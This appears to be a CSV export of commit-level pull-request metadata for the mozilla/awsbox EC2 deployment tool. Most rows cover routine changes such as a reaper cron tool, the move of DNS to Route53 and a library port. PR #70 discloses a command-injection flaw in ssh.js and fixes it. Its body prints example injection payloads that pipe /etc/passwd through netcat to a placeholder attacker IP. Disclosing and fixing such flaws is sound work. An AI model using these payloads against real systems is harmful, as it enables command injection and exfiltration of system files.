,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
44,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,9157792f6ef653e26d607a0dd0f40774197854b2,add email templates
45,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,71e4e2097527c29ac32ffa00e311742fc357b48f,move reaper code into its own CLI tool
46,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,f59e17ee39aa360cde70fe1fb3ba8c6111b22bd3,fix bugs in reaper.js from moving it into its own file
47,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,6d70ba190a9a019eac64df341d6d4771f10ee971,fix bugs in reaper.js from moving it into its own file
48,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,408f577cafdeb748f2c82346dd8f406ef8c037b1,add email notifications to reaper
49,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,416d61be44d490f82cd46a4d84a7361fb968aaf4,add termination code to reaper
50,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,dd78267dd19805902d3d0661dd0d8d0bc51e77a8,add spareme and nokill to awsbox.js
51,https://api.github.com/repos/mozilla/awsbox/pulls/87,87,#86 improve compatibility with EC2 CLI env. variables,,mostlygeek,83972,2013-07-19T19:55:52Z,NONE,False,5,5,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,a362381c09d4def5380b18b957978773e8adde43,#86 improve compatibility with EC2 CLI env. variables
52,https://api.github.com/repos/mozilla/awsbox/pulls/87,87,#86 improve compatibility with EC2 CLI env. variables,,mostlygeek,83972,2013-07-19T19:55:52Z,NONE,False,5,5,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,05f7bfe331143cd3bb406be611b7925fe7930bbb,#86 now usage of other env. variables actually works
53,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2ea9b2d4164084c952b6d6b1b46ab20d7cddad34,Start of the mechanical translation to AwsSum
54,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,cb1299e435ec296b32c4f0381644554d772c6f63,Change over the 'zones' command to use AwsSum
55,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,269efe9b57776b1950bfce12feef45d817ec68c1,Port both 'list' and 'test' over to AwsSum
56,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,443e84d35253e27e12e8f47001d0d6c5b95cdf78,Update the create command to use AwsSum
57,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4f019f960e50bd175c2179007e248dbfa90b7bc5,"Fix how the clients (both ec2 and route53) are being created.

Previously, the ec2 client was being created during require('./lib/aws.js')
but this was _before_ the AWS_* env vars were being checked. This is fixed.

Also, we were also checking the valid regions async via the API but AwsSum
already knows what regions are allowed, so this is now sync."
58,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,9eadd02400117b45b7f5fee3afe91f0d9d8e3249,Add the commands listdomains and listhosts for Route53
59,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,d084588c0fffccc51ad2362f1b7e9c135eb7d854,Update the command findbyip for Route53
60,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,c48811ce62be627dc41f5670fdcdaf40372d0bfe,Move all DNS to Route53
61,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b763fc61758e5f1408dfaabad04e445143cf3391,"Remove fmt, no longer needed"
62,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,439eb18f4f09c6b343cd94d9494facc8af761eaa,Fix the flattening of the various AWS env vars we look for
63,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,aff2c5b933540753c3d68ebeb0e988eceac9863b,First part of moving to nice-route53 : listdomains and inUse() ported
64,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,fc264b5d468ed7e866a040f5d6bf3c3cadd119cc,Convert listhosts over to nice-route53
65,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,dd799203b195f3c6ce055a7dbdf7b0933d0693d0,Update dns.findByIP() to use nice-route53
66,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,bdc12e9e9da155b39700f8b109a1a5859ce54134,Make updaterecord and deleterecord use nice-route53 and wait for the INSYNC event
67,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,15f722de4130ef62e289a00109b9f8e5945e404e,Depend on the latest release of nice-route53
68,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4b2dfe4a001a86d9cf871852c4c7febc55aa2389,Remove code which is no longer necessary
69,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,e124fef0fa8c58f792af8086a8430adce3496243,Fix some error checking
70,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ed32862b758788e2cb3f29d15afb15bd6b3de569,Make sure the inuse command does the right thing
71,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2efa893d2c8795814521a4acffda8a1ca7e960e0,Clarify doc for the zones command
72,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0a3ab368fea86b6949076664a5226fcd8fe63551,Remove debugging
73,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,a3ff57825981ebdc50f7c6826f9367f171397434,add awssum and awssum-amazon to list of dependencies
74,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0feeb1051a520c06eb2eb445bc6193df5d1998c2,Fix error reporting
75,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,3feaca355e0379f1e24e397643129e12596bd8ac,Default the ttl to 60 seconds
76,https://api.github.com/repos/mozilla/awsbox/pulls/78,78,Issue 62 move dns to aws,"Should be pulled after https://github.com/mozilla/awsbox/pull/75

Probably some corner cases I haven't covered, but will need some user testing.
",chilts,3048,2013-06-14T06:37:04Z,CONTRIBUTOR,True,426,275,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,da268bf454a63ab455824e680795379dde75c813,Update version number and required node version
77,https://api.github.com/repos/mozilla/awsbox/pulls/75,75,Port to awssum (from aws-lib),"Fixes #63. 
",chilts,3048,2013-06-11T23:16:02Z,CONTRIBUTOR,True,128,99,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2ea9b2d4164084c952b6d6b1b46ab20d7cddad34,Start of the mechanical translation to AwsSum
78,https://api.github.com/repos/mozilla/awsbox/pulls/75,75,Port to awssum (from aws-lib),"Fixes #63. 
",chilts,3048,2013-06-11T23:16:02Z,CONTRIBUTOR,True,128,99,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,cb1299e435ec296b32c4f0381644554d772c6f63,Change over the 'zones' command to use AwsSum
79,https://api.github.com/repos/mozilla/awsbox/pulls/75,75,Port to awssum (from aws-lib),"Fixes #63. 
",chilts,3048,2013-06-11T23:16:02Z,CONTRIBUTOR,True,128,99,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,269efe9b57776b1950bfce12feef45d817ec68c1,Port both 'list' and 'test' over to AwsSum
80,https://api.github.com/repos/mozilla/awsbox/pulls/75,75,Port to awssum (from aws-lib),"Fixes #63. 
",chilts,3048,2013-06-11T23:16:02Z,CONTRIBUTOR,True,128,99,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,443e84d35253e27e12e8f47001d0d6c5b95cdf78,Update the create command to use AwsSum
81,https://api.github.com/repos/mozilla/awsbox/pulls/74,74,Use child_process.spawn instead of exec for remote script calls,"Resolves issue #69.
",spitimage,1820846,2013-06-11T15:42:16Z,CONTRIBUTOR,True,11,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2875b1bb8a381010638554523aa84f368dc0c6df,Use child_process.spawn instead of exec for remote script calls
82,https://api.github.com/repos/mozilla/awsbox/pulls/72,72,Fix typo for proxess -> process,,chilts,3048,2013-06-06T18:37:35Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b2a853a160be2e530b4d92cb62be1b5accaa5db4,Fix typo for proxess -> process
83,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1a9d73b97a3da8d2a8bc16972477c1cc4d524628,use child_process.execFile to prevent potential command injection
84,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,d0fdce17f4b2793ed43e8269c9e6c9f19eaea822,use child_process.execFile to prevent local command injection
85,https://api.github.com/repos/mozilla/awsbox/pulls/70,70,Prevent local and remote command injection in ssh.js,"## exports.addSSHPubKey

`exports.addSSHPubKey` uses string concatenation to build a command that adds public keys to `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as `host`, which is extracted from a JSON object returned from an AWS API call. The `pubkey` parameter is the user-defined location of an SSH public key file. 

`pubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to upload a `pubkey` file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  
## 

OS command injection is also possible on the remote AWS instance: 

```
"" err; cat /etc/passwd | nc other_attacker_ip 1337 # 
```

Though, this is probably a non-issue as the purpose of the tool is to allow remote root access to the AWS instance.

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/194 

---
## exports.removeSSHPubKey

`exports.removeSSHPubKey` uses string concatenation to build a command that deletes SSH public keys from `~/.ssh/authorized_keys` on a remote AWS host via SSH. The parent function passes in the AWS instance's IP address as the `host` parameter, which is extracted from a JSON object returned from an AWS API call. The `escapedPubkey` parameter is the user-defined location of an SSH public key file. 

`escapedPubkey` is presumed to be a text file with public keys separated by `\n` or `\r\n`, but there is no validation. If OS commands are inserted, this could be used as an OS command injection vector for the local host.

Attacking the awsbox host:

```
'; cat /etc/passwd | nc some_attacker_ip 1337 #
```

It's conceivable that someone would use this feature to remove a public key using a file sent by another (malicious) person. This could have the unintentional consequence of allowing that malicious person to get code execution on the uploader's computer.  

Cross-reference: https://github.com/liftsecurity/nodesecurity/issues/182
",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,76b4c9991f626fc6a7c9e887ba8843a51f4c27a2,Escape pubkey to prevent local command injection
